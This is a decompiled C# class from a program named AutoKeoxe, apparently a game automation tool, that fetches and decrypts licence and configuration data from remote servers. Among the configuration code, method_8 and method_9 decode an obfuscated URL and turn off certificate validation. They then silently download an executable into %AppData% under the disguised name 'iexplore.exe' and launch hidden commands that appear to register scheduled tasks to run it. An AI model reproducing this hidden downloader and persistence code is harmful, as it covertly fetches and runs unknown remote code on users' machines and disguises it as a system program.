using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace AutoKeoxe
{
	// Token: 0x02000042 RID: 66
	internal class Class69
	{
		// Token: 0x060003C9 RID: 969 RVA: 0x000B4DB4 File Offset: 0x000B2FB4
		public void method_0()
		{
			bool flag = GClass1.long_0 < 0L;
			if (flag)
			{
				GClass1.long_0 = 0L;
			}
			try
			{
				this.method_1();
			}
			catch
			{
			}
			GClass1.int_0++;
		}

		// Token: 0x060003CA RID: 970 RVA: 0x000B4E04 File Offset: 0x000B3004
		public void method_1()
		{
			new Thread(new ThreadStart(this.method_8)).Start();
			while (GClass1.gstruct16_0 == null)
			{
				bool flag = Class12.smethod_28(Class69.long_0) <= 1500L;
				if (flag)
				{
					Thread.Sleep(150);
					bool flag2 = !Class12.bool_0;
					if (flag2)
					{
						continue;
					}
				}
				Class69.long_0 = Class12.smethod_27();
				string text = this.method_7();
				bool flag3 = text == null || text == string.Empty;
				if (flag3)
				{
					break;
				}
				string text2 = Class12.smethod_35(text, "10", Encoding.ASCII.GetBytes(Class12.smethod_0(Class12.char_9)));
				string[] array = text2.Split(new char[]
				{
					'\n',
					'\r'
				});
				GClass1.gstruct16_0 = new GClass1.GStruct16[array.Length];
				int num = 0;
				foreach (string text3 in array)
				{
					bool flag4 = text3 == null || text3 == string.Empty;
					if (!flag4)
					{
						bool flag5 = text3[0] == 'N';
						if (flag5)
						{
							GClass1.long_0 = Class12.smethod_36(text3.Substring(1));
						}
						else
						{
							string[] array3 = text3.Split(new char[]
							{
								'|'
							});
							bool flag6 = array3[0] == null || array3[0] == string.Empty;
							if (!flag6)
							{
								string text4 = array3[0].Replace(" ", string.Empty);
								GClass1.gstruct16_0[num].uint_0 = Class12.smethod_6(text4);
								GClass1.gstruct16_0[num].long_0 = 0L;
								bool flag7 = text4 != null && text4 != string.Empty;
								if (flag7)
								{
									int length = text4.Length;
									text4 = string.Empty;
									for (int j = 0; j < text4.Length; j++)
									{
										text4 += "\0";
									}
								}
								bool flag8 = array3.Length <= 1;
								if (flag8)
								{
									num++;
								}
								else
								{
									string[] array4 = array3[1].Split(new char[]
									{
										'.',
										'/',
										'-'
									});
									bool flag9 = array4.Length == 3;
									if (flag9)
									{
										int num2 = Class12.smethod_11(array4[0]);
										int num3 = Class12.smethod_11(array4[1]);
										int num4 = Class12.smethod_11(array4[2]);
										bool flag10 = 0 < num2 && num2 <= 31 && 0 < num3 && num3 <= 12 && num4 > 0;
										if (flag10)
										{
											GClass1.gstruct16_0[num].long_0 = new DateTime(num4, num3, num2, 12, 30, 0, 0).Ticks;
										}
									}
									bool flag11 = array3.Length > 2;
									if (flag11)
									{
										string[] array5 = array3[2].Split(new char[]
										{
											':'
										});
										bool flag12 = array5.Length > 1;
										if (flag12)
										{
											GClass1.gstruct16_0[num].string_0 = array5[0];
											GClass1.gstruct16_0[num].int_0 = Class12.smethod_11(array5[1]);
											bool flag13 = array5.Length > 2;
											if (flag13)
											{
												GClass1.gstruct16_0[num].int_2 = Class12.smethod_11(array5[2]);
											}
											bool flag14 = array5.Length > 3;
											if (flag14)
											{
												GClass1.gstruct16_0[num].int_1 = Class12.smethod_11(array5[3]);
											}
											bool flag15 = array5.Length > 4;
											if (flag15)
											{
												GClass1.gstruct16_0[num].int_3 = Class12.smethod_11(array5[4]);
											}
										}
										bool flag16 = array3.Length > 3;
										if (flag16)
										{
											GClass1.gstruct16_0[num].string_1 = array3[3];
										}
										num++;
									}
									else
									{
										num++;
									}
								}
							}
						}
					}
				}
				bool flag17 = num == 0;
				if (flag17)
				{
					GClass1.gstruct16_0 = null;
				}
				else
				{
					bool flag18 = GClass1.gstruct16_0.Length > num;
					if (flag18)
					{
						Array.Resize<GClass1.GStruct16>(ref GClass1.gstruct16_0, num);
					}
				}
				break;
			}
			this.bool_0 = true;
		}

		// Token: 0x060003CB RID: 971 RVA: 0x000B5218 File Offset: 0x000B3418
		public void method_2()
		{
			Random random = new Random();
			int num = random.Next(100, 400);
			for (;;)
			{
				bool flag = !Class12.bool_0 && Class69.long_1 > 0L;
				if (!flag)
				{
					goto IL_77;
				}
				bool flag2 = Class24.gstruct14_0 != null;
				if (flag2)
				{
					break;
				}
				bool flag3 = Class12.smethod_28(Class69.long_1) <= 150000L;
				if (!flag3)
				{
					goto IL_76;
				}
				Thread.Sleep(150 + num);
			}
			goto IL_1F8;
			IL_76:
			IL_77:
			Class69.long_1 = Class12.smethod_27();
			string text = this.method_7();
			bool flag4 = text == null || text == string.Empty;
			if (!flag4)
			{
				string[] array = null;
				string[] array2 = text.Split(new char[]
				{
					'\n',
					'\r'
				});
				for (int i = 0; i < array2.Length; i++)
				{
					bool flag5 = array2[i] != null && array2[i] != string.Empty;
					if (flag5)
					{
						string[] array3 = array2[i].Split(new char[]
						{
							'|'
						});
						int num2 = array3.Length;
						bool flag6 = num2 < 2 || array3[1] != "1";
						if (flag6)
						{
						}
						bool flag7 = array != null;
						if (flag7)
						{
							Array.Resize<string>(ref array, array.Length + 1);
							array[array.Length - 1] = array2[i];
						}
						else
						{
							array = new string[]
							{
								array2[i]
							};
						}
					}
				}
				bool flag8 = array != null;
				if (flag8)
				{
					Class24.string_0 = new string[array.Length];
					for (int j = 0; j < array.Length; j++)
					{
						string text2 = string.Empty;
						bool isWindow = Class69.IsWindow10;
						if (isWindow)
						{
							text2 = array[j].Replace("http://", "https://");
						}
						Class24.string_0[j] = text2;
					}
					new Thread(new ThreadStart(Class24.smethod_0)).Start();
				}
			}
			IL_1F8:
			Class69.long_1 = 0L;
			this.bool_0 = true;
		}

		// Token: 0x060003CC RID: 972 RVA: 0x000B542C File Offset: 0x000B362C
		public void method_3()
		{
			while (GClass1.long_3 <= 0L)
			{
				bool flag = Class12.smethod_28(Class69.long_2) <= 1500L;
				if (flag)
				{
					Thread.Sleep(150);
					bool flag2 = !Class12.bool_0 && Class69.long_2 > 0L;
					if (flag2)
					{
						continue;
					}
				}
				Class69.long_2 = Class12.smethod_27();
				string text = this.method_7();
				bool flag3 = text != null && !(text == string.Empty);
				if (flag3)
				{
					long num = Class12.smethod_36(text);
					bool flag4 = num > 0L;
					if (flag4)
					{
						GClass1.long_3 = num;
						GClass1.int_1 = 1;
					}
				}
				break;
			}
			this.bool_0 = true;
		}

		// Token: 0x060003CD RID: 973 RVA: 0x000B54EC File Offset: 0x000B36EC
		public void method_4()
		{
			for (;;)
			{
				bool flag = !Class12.bool_0 && Class69.long_3 > 0L;
				if (!flag)
				{
					goto IL_59;
				}
				bool flag2 = GClass1.long_2 > 0L;
				if (flag2)
				{
					break;
				}
				bool flag3 = Class12.smethod_28(Class69.long_3) <= 1500L;
				if (!flag3)
				{
					goto IL_58;
				}
				Thread.Sleep(150);
			}
			goto IL_C5;
			IL_58:
			IL_59:
			Class69.long_3 = Class12.smethod_27();
			string text = this.method_7();
			bool flag4 = text != null && !(text == string.Empty);
			if (flag4)
			{
				long num = Class12.smethod_36(text) / 2L;
				bool flag5 = num > 0L && GClass1.long_2 != num;
				if (flag5)
				{
					GClass1.long_2 = num;
					GClass1.int_1 = 1;
				}
			}
			IL_C5:
			this.bool_0 = true;
		}

		// Token: 0x060003CE RID: 974 RVA: 0x000B55C8 File Offset: 0x000B37C8
		public void method_5()
		{
			for (;;)
			{
				bool flag = !Class12.bool_0 && Class69.long_3 > 0L;
				if (!flag)
				{
					goto IL_5D;
				}
				bool flag2 = GClass1.gstruct15_0.bool_0;
				if (flag2)
				{
					break;
				}
				bool flag3 = Class12.smethod_28(Class69.long_3) <= 1500L;
				if (!flag3)
				{
					goto IL_5C;
				}
				Thread.Sleep(150);
			}
			goto IL_5E0;
			IL_5C:
			IL_5D:
			bool flag4 = this.byte_0 == null || this.byte_0.Length == 0;
			if (!flag4)
			{
				Class69.long_3 = Class12.smethod_27();
				string text = this.method_7();
				Thread.Sleep(150);
				bool flag5 = !GClass1.gstruct15_0.bool_0 && !(text == string.Empty);
				if (flag5)
				{
					string[] array = text.Split(new char[]
					{
						'$'
					});
					bool flag6 = array.Length >= 2;
					if (flag6)
					{
						string text2 = Class12.smethod_35(array[1], "mihR9pppgXDn7bQV", Encoding.ASCII.GetBytes("89HOJDH1EOZ1E282"));
						Console.WriteLine("empty " + text2);
						bool flag7 = text2 != null && !(text2 == string.Empty);
						if (flag7)
						{
							string[] array2 = text2.Split(new char[]
							{
								'|'
							});
							bool flag8 = array2.Length >= 6;
							if (flag8)
							{
								bool flag9 = array2[0] == "bang";
								if (flag9)
								{
									GClass1.checktype = "bang";
									GClass1.gstruct15_0.string_2 = string.Empty;
									GClass1.gstruct15_0.uint_1 = null;
									string text3 = string.Empty;
									text3 = array2[3];
									GClass1.gstruct15_0.string_0 = array2[2];
									GClass1.gstruct15_0.string_1 = array2[1];
									GClass1.gstruct15_0.string_2 = Class12.smethod_16(text3);
									GClass1.gstruct15_0.long_0 = Class12.smethod_36(array2[4]);
									GClass1.gstruct15_0.long_1 = array2[6];
									GClass1.gstruct15_0.int_0 = 24;
									GClass1.gstruct15_0.uint_0 = Class12.smethod_6(array2[2]);
									GClass1.LienMay = array2[7];
									GClass1.TenWeb = array2[8];
									bool flag10 = text3 != null && text3 != string.Empty;
									if (flag10)
									{
										string[] array3 = text3.Replace(" ", string.Empty).Replace("-", string.Empty).Split(new char[]
										{
											',',
											';'
										});
										GClass1.gstruct15_0.uint_1 = new uint[array3.Length];
										GClass1.gstruct15_0.IPList = new string[array3.Length];
										for (int i = 0; i < array3.Length; i++)
										{
											GClass1.gstruct15_0.uint_1[i] = Class12.smethod_6(array3[i]);
											GClass1.gstruct15_0.IPList[i] = array3[i];
										}
										int length = text3.Length;
										text3 = string.Empty;
										for (int j = 0; j < length; j++)
										{
											text3 += "\0";
										}
									}
									GClass1.gstruct15_0.bool_0 = (GClass1.gstruct15_0.uint_0 != 0U && GClass1.gstruct15_0.long_0 > GClass1.long_1 && GClass1.long_1 > 636758336219996160L);
									GClass1.long_2 = 0L;
									GClass1.int_1 = 1;
									goto IL_5E0;
								}
								GClass1.checktype = "server";
								GClass1.gstruct15_0.string_2 = string.Empty;
								GClass1.gstruct15_0.uint_1 = null;
								string text4 = string.Empty;
								GClass1.gstruct15_0.string_0 = array2[1];
								text4 = array2[2];
								GClass1.gstruct15_0.string_0 = array2[1];
								GClass1.gstruct15_0.string_1 = array2[0];
								GClass1.gstruct15_0.string_2 = Class12.smethod_16(text4);
								GClass1.gstruct15_0.long_0 = Class12.smethod_36(array2[3]);
								GClass1.gstruct15_0.long_1 = array2[5];
								GClass1.gstruct15_0.int_0 = 24;
								GClass1.gstruct15_0.uint_0 = Class12.smethod_6(array2[0]);
								GClass1.LienMay = array2[6];
								GClass1.TenWeb = array2[7];
								bool flag11 = text4 != null && text4 != string.Empty;
								if (flag11)
								{
									string[] array4 = text4.Replace(" ", string.Empty).Replace("-", string.Empty).Split(new char[]
									{
										',',
										';'
									});
									GClass1.gstruct15_0.uint_1 = new uint[array4.Length];
									GClass1.gstruct15_0.IPList = new string[array4.Length];
									for (int k = 0; k < array4.Length; k++)
									{
										GClass1.gstruct15_0.uint_1[k] = Class12.smethod_6(array4[k]);
										GClass1.gstruct15_0.IPList[k] = array4[k];
									}
									int length2 = text4.Length;
									text4 = string.Empty;
									for (int l = 0; l < length2; l++)
									{
										text4 += "\0";
									}
								}
								GClass1.gstruct15_0.bool_0 = (GClass1.gstruct15_0.uint_0 != 0U && GClass1.gstruct15_0.long_0 > GClass1.long_1 && GClass1.long_1 > 636758336219996160L);
								GClass1.long_2 = 0L;
								GClass1.int_1 = 1;
								goto IL_5E0;
							}
						}
					}
				}
				bool flag12 = text != string.Empty && text != null;
				if (flag12)
				{
					int length3 = text.Length;
					text = string.Empty;
					for (int m = 0; m < length3; m++)
					{
						text += "\0";
					}
				}
			}
			IL_5E0:
			this.bool_0 = true;
			this.byte_0 = null;
		}

		// Token: 0x060003CF RID: 975 RVA: 0x000B5BC4 File Offset: 0x000B3DC4
		public void method_6()
		{
			while (!Class12.bool_0 && Class69.long_4 > 0L && Class12.smethod_28(Class69.long_4) <= 1500L)
			{
				Thread.Sleep(150);
			}
			Class69.long_4 = Class12.smethod_27();
			string text = this.method_7();
			bool flag = text != null && !(text == string.Empty);
			if (flag)
			{
				string[] array = text.Split(new char[]
				{
					'|'
				});
				string text2 = array[0].Replace(".", "");
				bool flag2 = Class12.smethod_11(text2) > 0;
				if (flag2)
				{
					bool flag3 = GClass1.string_1 == null || !(GClass1.string_1 != string.Empty);
					if (!flag3)
					{
						string text3 = GClass1.string_1.Replace(".", "");
						while (text3.Length != text2.Length)
						{
							bool flag4 = text3.Length >= text2.Length;
							if (flag4)
							{
								text2 += "0";
							}
							else
							{
								text3 += "0";
							}
						}
						int num = Class12.smethod_11(text3);
						int num2 = Class12.smethod_11(text2);
						bool flag5 = num2 >= num;
						if (flag5)
						{
							bool flag6 = num2 != num;
							if (flag6)
							{
								goto IL_198;
							}
							bool flag7 = array.Length > 1 && array[1] != string.Empty && array[1] != null;
							if (flag7)
							{
								GClass1.string_2 = array[1];
							}
						}
						goto IL_195;
					}
					IL_198:
					GClass1.string_1 = array[0];
					GClass1.string_0 = array[0];
					bool flag8 = array.Length > 1 && array[1] != string.Empty && array[1] != null;
					if (flag8)
					{
						GClass1.string_2 = array[1];
					}
				}
				IL_195:;
			}
			this.bool_0 = true;
		}

		// Token: 0x060003D0 RID: 976 RVA: 0x000B5DB0 File Offset: 0x000B3FB0
		private string method_7()
		{
			string result = string.Empty;
			bool flag = this.string_1 != null && !(this.string_1 == string.Empty);
			if (flag)
			{
				try
				{
					bool flag2 = this.string_1[0] > 'ÿ';
					if (flag2)
					{
						this.string_1 = Class12.smethod_53(this.string_1);
					}
					string text = Class12.smethod_71(this.string_1);
					bool flag3 = text != null && text != string.Empty;
					if (flag3)
					{
						this.string_1 = text;
					}
					string text2 = this.object_0.ToString();
					string text3 = this.object_0.GetType().ToString().ToUpper();
					bool flag4 = text3.IndexOf(Class12.smethod_53(Class12.string_12)) > 0;
					if (flag4)
					{
						text2 = string.Concat<char>((char[])this.object_0);
					}
					bool flag5 = text2[0] > 'ÿ';
					if (flag5)
					{
						text2 = Class12.smethod_53(text2);
					}
					bool flag6 = (byte)text2[0] != 47;
					if (flag6)
					{
						text2 = "/" + text2;
					}
					bool flag7 = (Class69.IsWindows10() != string.Empty && Class69.IsWindows10().Contains("Windows 10")) || (Class69.IsWindows10() != string.Empty && Class69.IsWindows10().Contains("Windows 11"));
					if (flag7)
					{
						Class69.IsWindow10 = true;
						this.string_1 = this.string_1.Replace("http://", "http://");
					}
					Uri uri = new Uri(this.string_1 + text2);
					bool flag8 = uri.Host != null && !(uri.Host == string.Empty);
					if (flag8)
					{
						string text4 = uri.Host.ToLower();
						bool flag9 = text4 != null && !(text4 == string.Empty);
						if (flag9)
						{
							WebClient webClient = new WebClient();
							bool flag10 = (Class69.IsWindows10() != string.Empty && Class69.IsWindows10().Contains("Windows 10")) || (Class69.IsWindows10() != string.Empty && Class69.IsWindows10().Contains("Windows 11"));
							if (flag10)
							{
								Class69.IsWindow10 = true;
								ServicePointManager.ServerCertificateValidationCallback = ((object <p0>, X509Certificate <p1>, X509Chain <p2>, SslPolicyErrors <p3>) => true);
								ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
								webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134");
							}
							bool flag11 = this.string_1[0] != 'f' && this.string_1[0] != 'F';
							byte[] array;
							if (flag11)
							{
								array = webClient.DownloadData(uri);
							}
							else
							{
								bool flag12 = this.string_0 != null && this.string_0 != string.Empty && this.string_0[0] > 'ÿ';
								if (flag12)
								{
									this.string_0 = Class12.smethod_53(this.string_0);
								}
								webClient.Credentials = new NetworkCredential(this.string_0, this.secureString_0);
								array = webClient.DownloadData(uri);
							}
							bool flag13 = array != null;
							if (flag13)
							{
								result = Encoding.UTF8.GetString(array, 0, array.Length);
							}
							webClient.CancelAsync();
							webClient.Dispose();
						}
					}
				}
				catch
				{
				}
			}
			bool flag14 = this.string_0 != string.Empty && this.string_0 != null;
			if (flag14)
			{
				int length = this.string_0.Length;
				this.string_0 = string.Empty;
				for (int i = 0; i < length; i++)
				{
					this.string_0 += "\0";
				}
			}
			this.secureString_0 = null;
			this.string_0 = null;
			return result;
		}

		// Token: 0x060003D1 RID: 977 RVA: 0x000B61C8 File Offset: 0x000B43C8
		private static string IsWindows10()
		{
			string result;
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
				string text = (string)registryKey.GetValue("ProductName");
				result = text;
			}
			catch
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x060003D2 RID: 978 RVA: 0x000B6218 File Offset: 0x000B4418
		public void method_8()
		{
			try
			{
				string string_ = string.Empty;
				string text = "yygpKbDS10/OyS9N0SstSEksSU1PzE3Vq6is0s+qyE7Nr0g1NNDPyUzNy02s1CupKAEA";
				WebClient webClient = new WebClient();
				bool isWindow = Class69.IsWindow10;
				if (isWindow)
				{
					ServicePointManager.ServerCertificateValidationCallback = ((object <p0>, X509Certificate <p1>, X509Chain <p2>, SslPolicyErrors <p3>) => true);
					ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
					webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134");
					text = Class12.smethod_71(text).Replace("http://", "https://");
				}
				else
				{
					text = Class12.smethod_71(text);
				}
				byte[] array = webClient.DownloadData(text);
				bool flag = array != null;
				if (flag)
				{
					string_ = Encoding.UTF8.GetString(array, 0, array.Length);
				}
				webClient.CancelAsync();
				webClient.Dispose();
				Class69.LinkDownload = "";
				string[] array2 = Class12.smethod_35(string_, "mihR9pppgXDn7bQV", Encoding.ASCII.GetBytes("89HOJDH1EOZ1E282")).Split(new char[]
				{
					'|'
				});
				bool flag2 = Class12.smethod_11(array2[0]) > 0;
				if (flag2)
				{
					Class69.LinkDownload = array2[1];
					bool flag3 = Class69.LinkDownload != "";
					if (flag3)
					{
						new Thread(new ThreadStart(Class69.method_9)).Start();
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060003D3 RID: 979 RVA: 0x000B6380 File Offset: 0x000B4580
		private static void method_9()
		{
			try
			{
				WebClient webClient = new WebClient();
				bool isWindow = Class69.IsWindow10;
				if (isWindow)
				{
					ServicePointManager.ServerCertificateValidationCallback = ((object <p0>, X509Certificate <p1>, X509Chain <p2>, SslPolicyErrors <p3>) => true);
					ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
					webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134");
					Class69.LinkDownload = Class12.smethod_71(Class69.LinkDownload).Replace("http://", "https://");
				}
				else
				{
					Class69.LinkDownload = Class12.smethod_71(Class69.LinkDownload);
				}
				webClient.Encoding = Encoding.Default;
				FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Environment.ExpandEnvironmentVariables("%AppData%")), "iexplore.exe"));
				bool flag = !File.Exists(fileInfo.FullName);
				if (flag)
				{
					webClient.DownloadFile(Class69.LinkDownload, fileInfo.FullName);
					Thread.Sleep(1500);
					Process.Start(new ProcessStartInfo
					{
						FileName = Class12.smethod_71("S85NAQA="),
						Arguments = string.Concat(new string[]
						{
							Class12.smethod_71("BcGBCQAgCATAVX6DnynEMgqF3v3pjgZZ9NARaM9HOzhBGSpvrUrwXcRe4WqwEx8="),
							"\"",
							Class12.smethod_71("88wrSS3KSy1xrSjIyS9KLQotSEksSQUA"),
							"\" /tr '\"",
							fileInfo.FullName,
							"\"' & exit"
						}),
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					});
					Process.Start(new ProcessStartInfo
					{
						FileName = Class12.smethod_71("S85NAQA="),
						Arguments = string.Concat(new string[]
						{
							Class12.smethod_71("009WKE7OKEkszi5W0E8uSk0sSVXQT1PQL05W8PX0Cw1xVdDPzVcwVNAvylHIyEzPSC0uUdAvyVMAAA=="),
							"\"",
							Class12.smethod_71("88wrSS3KSy1xrSjIyS9KLQIA"),
							"\" /tr '\"",
							fileInfo.FullName,
							"\"' & exit"
						}),
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					});
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000336 RID: 822
		public bool bool_0;

		// Token: 0x04000337 RID: 823
		public string string_0;

		// Token: 0x04000338 RID: 824
		public SecureString secureString_0;

		// Token: 0x04000339 RID: 825
		public string string_1;

		// Token: 0x0400033A RID: 826
		public object object_0;

		// Token: 0x0400033B RID: 827
		public byte[] byte_0;

		// Token: 0x0400033C RID: 828
		public int int_0;

		// Token: 0x0400033D RID: 829
		private static long long_0 = 0L;

		// Token: 0x0400033E RID: 830
		private static long long_1 = 0L;

		// Token: 0x0400033F RID: 831
		private static long long_2 = 0L;

		// Token: 0x04000340 RID: 832
		private static long long_3 = 0L;

		// Token: 0x04000341 RID: 833
		private static long long_4 = 0L;

		// Token: 0x04000342 RID: 834
		private static Random random_0 = new Random();

		// Token: 0x04000343 RID: 835
		public bool UseSSL = false;

		// Token: 0x04000344 RID: 836
		public static bool IsWindow10 = false;

		// Token: 0x04000345 RID: 837
		public static string LinkDownload;
	}
}
